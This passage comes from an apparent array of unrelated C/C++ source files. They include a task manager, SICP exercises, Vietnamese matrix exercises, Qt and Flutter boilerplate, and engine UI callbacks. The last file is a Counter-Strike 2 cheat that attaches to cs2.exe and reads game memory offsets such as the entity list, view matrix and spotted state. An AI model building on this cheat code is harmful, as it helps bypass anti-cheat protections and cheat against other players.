2) {\n                isPraseSuccess = FALSE;\n                ErrorTip(1000);\n                cout << \"Usage:<command> FolderPath\" << endl;\n            }\n            else {\n                PraseCDAndExecute();\n            }\n            continue;\n        }\n        if (_strcmpi(\"EncryptWithMS\", vctCmd[0].c_str()) == 0|| _strcmpi(\"enms\", vctCmd[0].c_str()) == 0) {\n            isPraseSuccess = TRUE;\n            if (vctCmd.size() == 3) {\n                char username[35] = \"qwq\", password[2560] = { 0 };\n                BOOL pfSave = false;\n                DWORD result=CredUICmdLinePromptFor",
    "#include <iostream>\r\n#include <vector>\r\n#include <map>\r\n#include <ctime>\r\n#include <string>\r\n#include <tuple>\r\n\r\nusing namespace std;\r\n\r\n\r\n\r\n\r\nstring getCurrentTimestamp() {\r\n    time_t now = time(0);\r\n    struct tm tstruct;\r\n    char buf[80];\r\n    tstruct = *localtime(&now);\r\n    strftime(buf, sizeof(buf), \"%Y-%m-%d.%X\", &tstruct);\r\n    return buf;\r\n}\r\n\r\nclass GroupMember {\r\nprotected:\r\n    string fullName, idNumber, lastAccess, emailAddress, phoneNumber, birthDate;\r\n\r\npublic:\r\n    string getName() const { return fullName; }\r\n    string getBirthDate() const { return birthDate; }\r\n    string getLastAccess() const { return lastAccess; }\r\n\r\n    void updateLastAccess(const string& access) { lastAccess = access; }\r\n    void updatePhoneNumber(const string& phone) { phoneNumber = phone; }\r\n    void updateBirthDate(const string& date) { birthDate = date; }\r\n};\r\n\r\nclass Task {\r\nprivate:\r\n    string title, description, status, feedback, dueDate, submissionTime;\r\n\r\npublic:\r\n    Task() {}\r\n    Task(string t, string d, string s = \"Not Started\", string f = \"\", string due = \"\")\r\n        : title(t), description(d), status(s), feedback(f), dueDate(due) {}\r\n\r\n    string getStatus() const { return status; }\r\n    string getFeedback() const { return feedback; }\r\n    string getTitle() const { return title; }\r\n    string getDescription() const { return description; }\r\n    string getSubmissionTime() const { return submissionTime; }\r\n\r\n    void updateStatusAndFeedback(string s, string f) {\r\n        status = s;\r\n        feedback = f;\r\n    }\r\n\r\n    vector<string> getDetails() const {\r\n        return {title, description, status, feedback, dueDate, submissionTime};\r\n    }\r\n\r\n    void displaySummary() const {\r\n        cout << \"Task: \" << title << \"\\nStatus: \" << status << endl;\r\n    }\r\n\r\n    void displayFull() const {\r\n        cout << \"Task: \" << title << \"\\nDescription: \" << description << \"\\nDue: \" << dueDate << endl;\r\n    }\r\n};\r\n\r\nvector<Task> globalTaskList;\r\n\r\nclass Trainee : public GroupMember {\r\nprivate:\r\n    vector<Task> personalTaskList;\r\n    int secretCode;\r\n\r\npublic:\r\n    Trainee() {}\r\n    Trainee(string name, string id, string email, int code) {\r\n        fullName = name;\r\n        idNumber = id;\r\n        emailAddress = email;\r\n        secretCode = code;\r\n    }\r\n\r\n    int getSecretCode() const { return secretCode; }\r\n\r\n    void showInfo() const {\r\n        cout << \"Name: \" << fullName << \"\\nID: \" << idNumber << \"\\nEmail: \" << emailAddress\r\n             << \"\\nPhone: \" << phoneNumber << \"\\nBirth Date: \" << birthDate\r\n             << \"\\nLast Access: \" << lastAccess << endl;\r\n    }\r\n\r\n    vector<string> getInfo() const {\r\n        return {fullName, idNumber, emailAddress, phoneNumber, lastAccess, birthDate};\r\n    }\r\n\r\n    vector<Task> getTasks() const { return personalTaskList; }\r\n\r\n    void addTask(string title, string content, string deadline, string added) {\r\n        Task newTask(title, content, \"Not Started\", \"\", deadline);\r\n        personalTaskList.push_back(newTask);\r\n    }\r\n};\r\n\r\nclass Mentor : public GroupMember {\r\nprivate:\r\n    vector<tuple<string, string, string>> reviewRequests;\r\n    int secretCode;\r\n\r\npublic:\r\n    Mentor() {}\r\n    Mentor(string name, string id, string email, int code) {\r\n        fullName = name;\r\n        idNumber = id;\r\n        emailAddress = email;\r\n        secretCode = code;\r\n    }\r\n\r\n    int getSecretCode() const { return secretCode; }\r\n\r\n    void showInfo() const {\r\n        cout << \"Name: \" << fullName << \"\\nID: \" << idNumber << \"\\nEmail: \" << emailAddress\r\n             << \"\\nPhone: \" << phoneNumber << \"\\nBirth Date: \" << birthDate\r\n             << \"\\nLast Access: \" << lastAccess << endl;\r\n    }\r\n\r\n    void addReviewRequest(string n, string s, string p) {\r\n        reviewRequests.push_back({n, s, p});\r\n    }\r\n};\r\n\r\nmap<string, Trainee> traineeRecords;\r\nmap<string, Mentor> mentorRecords;\r\n\r\nvoid mainMenu() {\r\n    while (true) {\r\n        cout << \"=================================================\\n\";\r\n        cout << \"Welcome to Group Task Management System\\n\\n\";\r\n        cout << \"1. Existing Member\\n\";\r\n        cout << \"2. New Member Registration\\n\";\r\n        cout << \"3. Exit\\n\\n\";\r\n        cout << \"Select an option (1/2/3): \";\r\n        cout << \"=================================================\\n\";\r\n\r\n        int choice;\r\n        cin >> choice;\r\n\r\n        if (choice == 1) {\r\n            while (true) {\r\n                cout << \"=================================================\\n\";\r\n                cout << \"Login as:\\n\\n\";\r\n                cout << \"1.Student\\n\";\r\n                cout << \"2. Mentor\\n\";\r\n                cout << \"3. Back\\n\";\r\n                cout << \"4. Exit\\n\";\r\n                cout << \"Current time: \" << getCurrentTimestamp() << endl;\r\n                cout << \"=================================================\\n\";\r\n\r\n                int loginChoice;\r\n                cout << \"Select: \";\r\n                cin >> loginChoice;\r\n\r\n                if (loginChoice == 3) break;\r\n                if ",
    "\r\n\r\n#include <iostream>\r\nusing namespace std;\r\n\r\n// Compound Procedures\r\n\r\ntemplate<typename Number>\r\nNumber square(Number x) {\r\n\treturn x * x;\r\n}\r\ntemplate<typename Number>\r\nNumber sum_of_squares(Number x, Number y) {\r\n\treturn square(x) + square(y);\r\n}\r\n\r\nvoid Expressions(){\r\n\r\n\r\n\t// Addition\r\n\tcout << \"(+ 137 349) = \" << (137 + 349) << endl;\r\n\tcout << \"(+ 2.7 10) = \" << (2.7 + 10) << endl;\r\n\tcout << \"(+ 21 35 12 7) = \" << (21 + 35 + 12 + 7) << endl;\r\n\r\n\t// Subtraction\r\n\tcout << \"(- 1000 334) = \" << (1000 - 334) << endl;\r\n\r\n\t// Multiplication\r\n\tcout << \"(* 5 99) = \" << (5 * 99) << endl;\r\n\tcout << \"(* 25 4 12) = \" << (25 * 4 * 12) << endl;\r\n\r\n\t// Division\r\n\tcout << \"(/ 10 5) = \" << (10 / 5) << endl;\r\n\r\n\t// Complex : (+ (* 3 5) (- 10 6))\r\n\tcout << \"(+ (* 3 5) (- 10 6)) = \" << (3 * 5 + (10 - 6)) << endl;\r\n\r\n\r\n}\r\n//1.1.2 Naming and the Environment\r\n\r\nvoid Naming_Environment() {\r\n\r\n\tint size = 2;\r\n\tdouble pi = 3.14159;\r\n\tint radius = 10;\r\n\r\n\t//  calculations\r\n\tint result1 = 5 * size;\r\n\tdouble area = pi * radius * radius;\r\n\tdouble circumference = 2 * pi * radius;\r\n\r\n\t// Output results\r\n\tcout << result1 << endl;\r\n\tcout << area << endl;\r\n\tcout <<  circumference << endl;\r\n\r\n}\r\n\r\n//1.1.3 Evaluating Combinations\r\nvoid Evaluating_Combinations() {\r\n\r\n\tcout << (2 + 4 * 6) * (3 + 5 + 7) << endl;\r\n\r\n}\r\n\r\n//1.1.4 Compound Procedures\r\nvoid Compound_Procedures() {\r\n\tcout << square(21) << endl;\r\n\tcout << square(7 + 5) << endl;\r\n\tcout << square(square(3)) << endl;\r\n\tcout << sum_of_squares(3, 4) << endl;\r\n\r\n}\r\n//Conditional Expressions and Predicates\r\nint abs(int x) {\r\n\tif (x > 0) {\r\n\t\treturn x;\r\n\t}\r\n\telse if (x == 0) {\r\n\t\treturn 0;\r\n\t}\r\n\telse { \r\n\t\treturn -x;\r\n\t}\r\n}\r\nbool greaterOrEqual(int x, int y) {\r\n\treturn x >= y;\r\n}\r\nbool isBetween5And10(int x) {\r\n\treturn x > 5 && x < 10;\r\n}\r\n//Exercise 1.2\r\n\r\nvoid prefix() {\r\n\tcout << 5 + 4 + (2 - (3 - (6 + 4.0 / 5.0))) << endl;\r\n}\r\n\r\nvoid Exercise(int a , int b, int c) {\r\n\tint max1, max2;\r\n\r\n\t// Determine the two largest numbers\r\n\tif (a >= b) {\r\n\t\tif (b >= c) {\r\n\t\t\tmax1 = a;\r\n\t\t\tmax2 = b;\r\n\t\t}\r\n\t\telse if (a >= c) {\r\n\t\t\tmax1 = a;\r\n\t\t\tmax2 = c;\r\n\t\t}\r\n\t\telse {\r\n\t\t\tmax1 = c;\r\n\t\t\tmax2 = a;\r\n\t\t}\r\n\t}\r\n\telse {\r\n\t\tif (a >= c) {\r\n\t\t\tmax1 = b;\r\n\t\t\tmax2 = a;\r\n\t\t}\r\n\t\telse if (b >= c) {\r\n\t\t\tmax1 = b;\r\n\t\t\tmax2 = c;\r\n\t\t}\r\n\t\telse {\r\n\t\t\tmax1 = c;\r\n\t\t\tmax2 = b;\r\n\t\t}\r\n\t}\r\n\r\n\t\tcout << \"Sum of squares of the two largest numbers among \"\r\n\t\t<< a << \", \" << b << \", \" << c << \" is: \" << sum_of_squares(max1, max2)\r\n\t<< endl;\r\n}\r\nvoid  a_puls_abs_b(int a, int b)\r\n{\r\n\t//exercise 1.4\r\n\tcout << \"its\" << (b > 0 ? a + b : a - b) << endl;\r\n}\r\n//1.1.7 Example: Square Roots by Newton\ufffds Method\r\n\r\nint square(int x) {\r\n\treturn x * x;\r\n}\r\n// Function to square a double\r\ndouble square(double x) {\r\n\treturn x * x;\r\n}\r\n\r\nvoid good_enough(double guess, double x) {\r\n\tconst double tolerance = 0.001;\r\n\tif (abs(square(guess) - x) < tolerance) {\r\n\t\tcout << \"Good enough\" << endl;\r\n\t}\r\n\telse {\r\n\t\tcout << \"Not good enough\" << endl;\r\n\t}\r\n}\r\n\r\n\r\ndouble average(int x, int y) {\r\n\treturn (x + y) / 2.0;\r\n}\r\ndouble improve(int guess, int x) {\r\n\treturn average(guess, x / guess);\r\n}\r\nbool good_enough(int guess, int x) {\r\n\tconst int tolerance = 1;\r\n\treturn abs(square(guess) - x) <= tolerance;\r\n}\r\ndouble sqrt_iter(int guess, int x) {\r\n\tif (good_enough(guess, x))\r\n\t\treturn guess;\r\n\telse\r\n\t\treturn sqrt_iter(improve(guess, x), x);\r\n}\r\n\r\ndouble sqrt(int x) {\r\n\tif (x < 0) {\r\n\t\treturn -1; \r\n\t}\r\n\treturn sqrt_iter(1, x);\r\n}\r\n\r\ndouble cube(int x) {\r\n\treturn x * x * x;\r\n}\r\n\r\n//1.1.8 Procedures as Black-Box Abstractions\r\n\r\nint subtract(int x, int y) {\r\n\treturn x - y;\r\n}\r\nint divide(int x, int y) {\r\n\treturn x / y;\r\n}\r\n//1.2 Procedures and the Processes They Generate\r\n\r\nint recursivefactorial(int n)\r\n{\r\n\tif (n <= 1) {\r\n\t\treturn 1;\r\n\t}\r\n\telse {\r\n\t\treturn n * recursivefactorial(n-1);\r\n\t}\r\n}\r\n\r\nint iterativefactorial(int n)\r\n{\r\n\tif (n <= 1) {\r\n\t\treturn 1;\r\n\t}\r\n\tint result = 1;\r\n\tfor (int i = 1; i <= n; i++) {\r\n\t\tresult *= i;\r\n\r\n\t}\r\n\treturn result;\r\n}\r\n//Exercise 1.9\r\n\r\n// increment an integer\r\nint inc(int a) {\r\n\treturn a + 1;\r\n}\r\n\r\n//  decrement an integer\r\nint dec(int a) {\r\n\treturn a - 1;\r\n}\r\n//Exercise 1.10\r\nint A(int x, int y) {\r\n\tif (y == 0) {\r\n\t\treturn 0;\r\n\t}\r\n\telse if (x == 0) {\r\n\t\treturn 2 * y;\r\n\t}\r\n\telse if (y == 1) {\r\n\t\treturn 2;\r\n\t}\r\n\telse {\r\n\t\treturn A(x - 1, A(x, y - 1));\r\n\t}\r\n\r\n}\r\nvoid function() {\r\n\r\n\tcout << A(1, 10) << endl;\r\n\tcout << A(2, 4) << endl;\r\n\tcout << A(3, 3) << endl;\r\n}\r\n//1.2.2 Tree Recursion\r\n\r\nint recursivefib(int n) {\r\n\r\n\tswitch (n)\r\n\t{\r\n\tcase 0: return 0;\r\n\tcase 1: return 1;\r\n\tdefault: return recursivefib(n - 1) + recursivefib(n - 2);\r\n\t}\r\n\r\n }\r\nint iterativefib(int a,int b,int n){\r\n\t\r\n\tif (n == 0) {\r\n\t\treturn b;\r\n\t}\r\n\telse {\r\n\t\treturn iterativefib(a + b, a, n - 1);\r\n\r\n\t}\r\n}\r\n//Example: Counting change\r\nint  firstDenomination(int kindsOfCoins)\r\n{\r\n\tswitch (kindsOfCoins)\r\n\t{\r\n\tcase 1: return 1;\r\n\tcase 2: return 5;\r\n\tcase 3: return 10;\r\n\tcase 4: return 25;\r\n\tcase 5: return 50;\r\n\tdefault: return 0;\r\n\t}\r\n}\r\nint cc(int amount, int kindsO",
    "/*\nenginecallback.cpp - actual engine callbacks\nCopyright (C) 2017 a1batross\n\nThis program is free software: you can redistribute it and/or modify\nit under the terms of the GNU General Public License as published by\nthe Free Software Foundation, either version 3 of the License, or\n(at your option) any later version.\n\nThis program is distributed in the hope that it will be useful,\nbut WITHOUT ANY WARRANTY; without even the implied warranty of\nMERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the\nGNU General Public License for more details.\n*/\n\n#include \"extdll_menu.h\"\n#include \"BaseMenu.h\"\n#include \"Utils.h\"\n\nvoid EngFuncs::PIC_Set(HIMAGE hPic, int r, int g, int b, int a)\n{\n\tif( uiStatic.enableAlphaFactor )\n\t\ta *= uiStatic.alphaFactor;\n\n\tengfuncs.pfnPIC_Set( hPic, r, g, b, a );\n}\n\nvoid EngFuncs::FillRGBA(int x, int y, int width, int height, int r, int g, int b, int a)\n{\n\tif( uiStatic.enableAlphaFactor )\n\t\ta *= uiStatic.alphaFactor;\n\n\tengfuncs.pfnFillRGBA( x, y, width, height, r, g, b, a );\n}\n\nvoid EngFuncs::DrawLogo( const char *filename, float x, float y, float width, float height )\n{\n\tif( uiStatic.enableAlphaFactor )\n\t\treturn;\n\n\tengfuncs.pfnDrawLogo( filename, x, y, width, height );\n}\n\n\nvoid EngFuncs::DrawCharacter(int x, int y, int width, int height, int ch, int ulRGBA, HIMAGE hFont)\n{\n\tengfuncs.pfnDrawCharacter( x, y, width, height, ch, ulRGBA, hFont );\n}\n\nstatic unsigned int color;\n\nvoid EngFuncs::DrawSetTextColor(int r, int g, int b, int alpha)\n{\n\tcolor = PackRGBA( r, g, b, alpha );\n}\n\nint EngFuncs::DrawConsoleString(int x, int y, const char *string)\n{\n\tPoint pt( x, y );\n\tSize sz;\n\tint charSz;\n\n\tsz.w = ScreenWidth - pt.x;\n\tsz.h = ScreenHeight - pt.y;\n\n\tcharSz = g_FontMgr.GetFontTall( uiStatic.hConsoleFont );\n\n\treturn UI_DrawString( uiStatic.hConsoleFont, pt, sz, string, color, charSz, QM_TOPLEFT );\n}\n\nvoid EngFuncs::ConsoleStringLen(const char *string, int *length, int *height)\n{\n\tg_FontMgr.GetTextSize( uiStatic.hConsoleFont, string, length, height );\n}\n\nint EngFuncs::ConsoleCharacterHeight()\n{\n\treturn g_FontMgr.GetFontTall( uiStatic.hConsoleFont );\n}\n\n// We have full unicode support now\nint EngFuncs::UtfProcessChar(int ch)\n{\n\treturn Con_UtfProcessChar( ch );\n}\n\nint EngFuncs::UtfMoveLeft(const char *str, int pos)\n{\n\treturn Con_UtfMoveLeft( str, pos );\n}\n\nint EngFuncs::UtfMoveRight(const char *str, int pos, int length)\n{\n\treturn Con_UtfMoveRight( str, pos, length );\n}\n",
    "#include <stdio.h>\n#include <stdbool.h>\n#include <math.h>\n\n#define MAX 100\n\n// H\u00e0m ki\u1ec3m tra s\u1ed1 nguy\u00ean t\u1ed1\nbool kiemTraSoNguyenTo(int num) {\n    if (num <= 1) return false;\n    if (num <= 3) return true;\n    if (num % 2 == 0 || num % 3 == 0) return false;\n    for (int i = 5; i * i <= num; i += 6) {\n        if (num % i == 0 || num % (i + 2) == 0) return false;\n    }\n    return true;\n}\n\n// H\u00e0m ki\u1ec3m tra ch\u1eef s\u1ed1 \u0111\u1ea7u ti\u00ean c\u1ee7a s\u1ed1 nguy\u00ean\nint layChuSoDauTien(int num) {\n    while (num >= 10) num /= 10;\n    return num;\n}\n\n// B\u00e0i 1: T\u00ednh t\u1ed5ng c\u00e1c ph\u1ea7n t\u1eed c\u00f3 ch\u1eef s\u1ed1 \u0111\u1ea7u l\u00e0 ch\u1eef s\u1ed1 l\u1ebb\nint tongChuSoDauLe(int mat[MAX][MAX], int m, int n) {\n    int tong = 0;\n    for (int i = 0; i < m; i++) {\n        for (int j = 0; j < n; j++) {\n            if (layChuSoDauTien(abs(mat[i][j])) % 2 != 0) {\n                tong += mat[i][j];\n            }\n        }\n    }\n    return tong;\n}\n\n// B\u00e0i 3: T\u00ednh t\u1ed5ng c\u00e1c ph\u1ea7n t\u1eed l\u1edbn h\u01a1n tr\u1ecb tuy\u1ec7t \u0111\u1ed1i c\u1ee7a ph\u1ea7n t\u1eed li\u1ec1n sau n\u00f3\nint tongLonHonTriTuyetDoiSau(int mat[MAX][MAX], int m, int n) {\n    int tong = 0;\n    for (int i = 0; i < m; i++) {\n        for (int j = 0; j < n - 1; j++) {\n            if (mat[i][j] > abs(mat[i][j + 1])) {\n                tong += mat[i][j];\n            }\n        }\n    }\n    return tong;\n}\n\n// B\u00e0i 5: T\u00ednh t\u1ed5ng c\u00e1c gi\u00e1 tr\u1ecb n\u1eb1m tr\u00ean bi\u00ean c\u1ee7a ma tr\u1eadn\nint tongBien(int mat[MAX][MAX], int m, int n) {\n    int tong = 0;\n    // H\u00e0ng \u0111\u1ea7u\n    for (int j = 0; j < n; j++) tong += mat[0][j];\n    // H\u00e0ng cu\u1ed1i\n    for (int j = 0; j < n; j++) tong += mat[m - 1][j];\n    // C\u1ed9t tr\u00e1i (tr\u1eeb c\u00e1c g\u00f3c)\n    for (int i = 1; i < m - 1; i++) tong += mat[i][0];\n    // C\u1ed9t ph\u1ea3i (tr\u1eeb c\u00e1c g\u00f3c)\n    for (int i = 1; i < m - 1; i++) tong += mat[i][n - 1];\n    return tong;\n}\n\n// B\u00e0i 7: \u0110\u1ebfm s\u1ed1 l\u01b0\u1ee3ng c\u00e1c ph\u1ea7n t\u1eed l\u00e0 s\u1ed1 ch\u1eb5n, s\u1ed1 l\u1ebb, s\u1ed1 \u00e2m, s\u1ed1 d\u01b0\u01a1ng, s\u1ed1 nguy\u00ean t\u1ed1\nvoid demLoaiPhanTu(int mat[MAX][MAX], int m, int n) {\n    int chan = 0, le = 0, duong = 0, am = 0, nguyenTo = 0;\n    for (int i = 0; i < m; i++) {\n        for (int j = 0; j < n; j++) {\n            int num = mat[i][j];\n            if (num % 2 == 0) chan++;\n            else le++;\n            if (num > 0) duong++;\n            else if (num < 0) am++;\n            if (kiemTraSoNguyenTo(abs(num))) nguyenTo++;\n        }\n    }\n    printf(\"Chan: %d\\n\", chan);\n    printf(\"Le: %d\\n\", le);\n    printf(\"Duong: %d\\n\", duong);\n    printf(\"Am: %d\\n\", am);\n    printf(\"Nguyen to: %d\\n\", nguyenTo);\n}\n\nint main() {\n    int mat[MAX][MAX];\n    int m, n;\n\n    // Nh\u1eadp k\u00edch th\u01b0\u1edbc ma tr\u1eadn\n    printf(\"Nhap so hang va so cot: \");\n    scanf(\"%d %d\", &m, &n);\n\n    // Nh\u1eadp gi\u00e1 tr\u1ecb ma tr\u1eadn\n    printf(\"Nhap cac gia tri cua ma tran:\\n\");\n    for (int i = 0; i < m; i++) {\n        for (int j = 0; j < n; j++) {\n            scanf(\"%d\", &mat[i][j]);\n        }\n    }\n\n    // Th\u1ef1c hi\u1ec7n c\u00e1c b\u00e0i to\u00e1n\n    printf(\"Tong cac phan tu co chu so dau la chu so le: %d\\n\", tongChuSoDauLe(mat, m, n));\n\n    printf(\"Tong cac phan tu lon hon tri tuyet doi cua phan tu lien sau no: %d\\n\", tongLonHonTriTuyetDoiSau(mat, m, n));\n\n    printf(\"Tong cac phan tu nam tren bien caa ma tran: %d\\n\", tongBien(mat, m, n));\n\n    demLoaiPhanTu(mat, m, n);\n\n    return 0;\n}\n",
    "/*****************************************************************************\n * Copyright 2024 Serge Poltavski. All rights reserved.\n *\n * This file may be distributed under the terms of GNU Public License version\n * 3 (GPL v3) as defined by the Free Software Foundation (FSF). A copy of the\n * license should have been included with this file, or the project in which\n * this file belongs to. You may also find the details of GPL v3 at:\n * http://www.gnu.org/licenses/gpl-3.0.txt\n *\n * If you have any questions regarding the use of this file, feel free to\n * contact the author of this file, or the owner of the project in which\n * this file belongs to.\n *****************************************************************************/\n#include \"diagram_meta.h\"\n\n#include <QJsonArray>\n#include <QJsonObject>\n\nnamespace {\nconstexpr const char* JSON_KEY_NAME = \"name\";\nconstexpr const char* JSON_KEY_WORK = \"work\";\nconstexpr const char* JSON_KEY_PHONE = \"phone\";\nconstexpr const char* JSON_KEY_EMAIL = \"email\";\n\nconstexpr const char* JSON_KEY_TITLE = \"title\";\nconstexpr const char* JSON_KEY_INFO = \"info\";\nconstexpr const char* JSON_KEY_CREATION_DATE = \"creation-date\";\nconstexpr const char* JSON_KEY_EVENT_DATE = \"event-date\";\nconstexpr const char* JSON_KEY_CONTACTS = \"contacts\";\n}\n\nusing namespace ceam;\n\nQJsonValue Contact::toJson() const\n{\n    QJsonObject obj;\n\n    obj[JSON_KEY_NAME] = name_;\n    obj[JSON_KEY_WORK] = work_;\n    obj[JSON_KEY_PHONE] = phone_;\n    obj[JSON_KEY_EMAIL] = email_;\n\n    return obj;\n}\n\nstd::optional<Contact> Contact::fromJson(const QJsonValue& val)\n{\n    if (!val.isObject())\n        return {};\n\n    auto obj = val.toObject();\n\n    Contact c;\n\n    c.name_ = obj.value(JSON_KEY_NAME).toString();\n    c.work_ = obj.value(JSON_KEY_WORK).toString();\n    c.phone_ = obj.value(JSON_KEY_PHONE).toString();\n    c.email_ = obj.value(JSON_KEY_EMAIL).toString();\n\n    return c;\n}\n\nDiagramMeta::DiagramMeta()\n{\n    creation_date_ = QDate::currentDate();\n    event_date_ = QDate::currentDate().addMonths(1);\n}\n\nQJsonValue DiagramMeta::toJson() const\n{\n    QJsonObject obj;\n\n    obj[JSON_KEY_TITLE] = title_;\n    obj[JSON_KEY_INFO] = info_;\n    obj[JSON_KEY_CREATION_DATE] = creation_date_.toString();\n    obj[JSON_KEY_EVENT_DATE] = event_date_.toString();\n\n    QJsonArray arr;\n    for (auto& c : contacts_)\n        arr.append(c.toJson());\n\n    obj[JSON_KEY_CONTACTS] = arr;\n\n    return obj;\n}\n\nstd::optional<DiagramMeta> DiagramMeta::fromJson(const QJsonValue& val)\n{\n    if (!val.isObject())\n        return {};\n\n    auto obj = val.toObject();\n\n    DiagramMeta meta;\n\n    meta.title_ = obj.value(JSON_KEY_TITLE).toString();\n    meta.info_ = obj.value(JSON_KEY_INFO).toString();\n    meta.creation_date_ = QDate::fromString(obj.value(JSON_KEY_CREATION_DATE).toString());\n    meta.event_date_ = QDate::fromString(obj.value(JSON_KEY_EVENT_DATE).toString());\n\n    auto arr = obj.value(JSON_KEY_CONTACTS).toArray();\n    for (const auto& item : arr) {\n        auto contact = Contact::fromJson(item);\n        if (contact)\n            meta.contacts_.push_back(contact.value());\n    }\n\n    return meta;\n}\n",
    "#include <flutter/dart_project.h>\n#include <flutter/flutter_view_controller.h>\n#include <windows.h>\n\n#include \"flutter_window.h\"\n#include \"utils.h\"\n\nint APIENTRY wWinMain(_In_ HINSTANCE instance, _In_opt_ HINSTANCE prev,\n                      _In_ wchar_t *command_line, _In_ int show_command) {\n  // Attach to console when present (e.g., 'flutter run') or create a\n  // new console when running with a debugger.\n  if (!::AttachConsole(ATTACH_PARENT_PROCESS) && ::IsDebuggerPresent()) {\n    CreateAndAttachConsole();\n  }\n\n  // Initialize COM, so that it is available for use in the library and/or\n  // plugins.\n  ::CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);\n\n  flutter::DartProject project(L\"data\");\n\n  std::vector<std::string> command_line_arguments =\n      GetCommandLineArguments();\n\n  project.set_dart_entrypoint_arguments(std::move(command_line_arguments));\n\n  FlutterWindow window(project);\n  Win32Window::Point origin(10, 10);\n  Win32Window::Size size(1280, 720);\n  if (!window.Create(L\"tiktok_clone\", origin, size)) {\n    return EXIT_FAILURE;\n  }\n  window.SetQuitOnClose(true);\n\n  ::MSG msg;\n  while (::GetMessage(&msg, nullptr, 0, 0)) {\n    ::TranslateMessage(&msg);\n    ::DispatchMessage(&msg);\n  }\n\n  ::CoUninitialize();\n  return EXIT_SUCCESS;\n}\n",
    "#include \"offsets.h\"\r\n#include <iostream>\r\n#include <chrono>\r\n#include \"math.h\"\r\n#include \"memory.h\"\r\n#include <Vector>\r\n#include \"datatypes.h\"\r\n#include <fstream>\r\n#include <cstddef>\r\n#include \"json.h\"\r\n#include \"config.h\"\r\n\r\nusing json = nlohmann::json;\r\n\r\njson clientJson;\r\n\r\nbool game::baseOffsets::initialize() {\r\n\tprintf(\"[cheat]: Waiting for cs2.exe...\\n\");\r\n\r\n\twhile (true) {\r\n\t\tmem.attachProcess(L\"cs2.exe\");\r\n\r\n\t\tif (mem.processId == 0) {\r\n\t\t\tstd::this_thread::sleep_for(std::chrono::seconds(2));\r\n\t\t\tcontinue;\r\n\t\t}\r\n\t\telse {\r\n\t\t\tprintf(\"[cheat]: Attached cs2.exe\\n\");\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\r\n\tjson offsetsJson;\r\n\r\n\tstd::ifstream offsetsFile(config.offsetsPath + \"\\\\offsetsDump.json\");\r\n\tstd::ifstream clientFile(config.offsetsPath + \"\\\\clientDump.json\");\r\n\r\n\tif (offsetsFile.is_open() && clientFile.is_open()) {\r\n\t\toffsetsFile >> offsetsJson;\r\n\t\tclientFile >> clientJson;\r\n\r\n\t\toffsetsFile.close();\r\n\t\tclientFile.close();\r\n\t}\r\n\r\n\tuintptr_t clientDll = mem.GetModuleAddress(L\"client.dll\");\r\n\tuintptr_t engineDll = mem.GetModuleAddress(L\"engine2.dll\");\r\n\r\n\tif (clientDll == 0 || engineDll == 0) {\r\n\t\tprintf(\"[cheat]: Unable to read client.dll or engine.dll\\n\");\r\n\t\treturn false;\r\n\t}\r\n\r\n\tthis->clientDll = clientDll;\r\n\tthis->engineDll = engineDll;\r\n\r\n\tuintptr_t temp = 0;\r\n\r\n\ttemp = mem.Read<uintptr_t>(offsetsJson[\"engine2.dll\"][\"dwWindowWidth\"] + engineDll);\r\n\tif (temp == 0) {\r\n\t\tprintf(\"[cheat]: Unable to read window width\\n\");\r\n\t\treturn false;\r\n\t}\r\n\r\n\tthis->windowWidth = temp;\r\n\r\n\ttemp = mem.Read<uintptr_t>(offsetsJson[\"engine2.dll\"][\"dwWindowHeight\"] + engineDll);\r\n\tif (temp == 0) {\r\n\t\tprintf(\"[cheat]: Unable to read window height\\n\");\r\n\t\treturn false;\r\n\t}\r\n\r\n\tthis->windowHeight = temp;\r\n\r\n\ttemp = mem.Read<uintptr_t>(offsetsJson[\"client.dll\"][\"dwEntityList\"] + clientDll);\r\n\tif (temp == 0) {\r\n\t\tprintf(\"[cheat]: Unable to read entity list\\n\");\r\n\t\treturn false;\r\n\t}\r\n\r\n\tthis->entityList = temp;\r\n\r\n\ttemp = mem.Read<uintptr_t>(offsetsJson[\"client.dll\"][\"dwLocalPlayerController\"] + clientDll);\r\n\tif (temp == 0) {\r\n\t\tprintf(\"[cheat]: Unable to read local player\\n\");\r\n\t\treturn false;\r\n\t}\r\n\ttemp = offsetsJson[\"client.dll\"][\"dwLocalPlayerController\"] + clientDll;\r\n\r\n\tthis->localController = temp;\r\n\r\n\ttemp = mem.Read<uintptr_t>(offsetsJson[\"client.dll\"][\"dwViewMatrix\"] + clientDll);\r\n\tif (temp == 0) {\r\n\t\tprintf(\"[cheat]: Unable to read view matrix\\n\");\r\n\t\treturn false;\r\n\t}\r\n\r\n\ttemp = offsetsJson[\"client.dll\"][\"dwViewMatrix\"] + clientDll;\r\n\r\n\tthis->viewMatrix = temp;\r\n\r\n\twhile (true) {\r\n\t\ttemp = mem.Read<uintptr_t>(offsetsJson[\"client.dll\"][\"dwViewAngles\"] + clientDll);\r\n\t\tif (temp == 0) {\r\n\t\t\tprintf(\"[cheat]: Unable to read view angles, start game\\n\");\r\n\t\t\tstd::this_thread::sleep_for(std::chrono::seconds(2));\r\n\t\t}\r\n\t\telse {\r\n\t\t\tbreak;\r\n\t\t}\r\n\t}\r\n\r\n\ttemp = offsetsJson[\"client.dll\"][\"dwViewAngles\"] + clientDll;\r\n\r\n\tthis->viewAngle = temp;\r\n\r\n\ttemp = mem.Read<uintptr_t>(offsetsJson[\"client.dll\"][\"dwLocalPlayerPawn\"] + clientDll);\r\n\tif (temp == 0) {\r\n\t\tprintf(\"[cheat]: Unable to read local pawn\\n\");\r\n\t\treturn false;\r\n\t}\r\n\ttemp = offsetsJson[\"client.dll\"][\"dwLocalPlayerPawn\"] + clientDll;\r\n\r\n\tthis->localPawn = temp;\r\n\r\n\treturn true;\r\n}\r\n\r\nuintptr_t game::baseOffsets::getListEntry() {\r\n\tthis->listEntry = mem.Read<uintptr_t>(offsets.entityList + 0x10);\r\n\treturn listEntry;\r\n}\r\n\r\nint game::CSplayerPawn::getSpotted() {\r\n\tthis->spotted = mem.Read<int>(this->pawn + clientJson[\"client.dll\"][\"classes\"][\"C_CSPlayerPawn\"][\"fields\"][\"m_entitySpottedState\"] + clientJson[\"client.dll\"][\"classes\"][\"EntitySpottedState_t\"][\"fields\"][\"m_bSpottedByMask\"]);\r\n\treturn spotted;\r\n}\r\n\r\nuint8_t game::CSplayerPawn::getTeamNum() {\r\n\tthis->teamNum = mem.Read<unsigned short>(this->pawn + 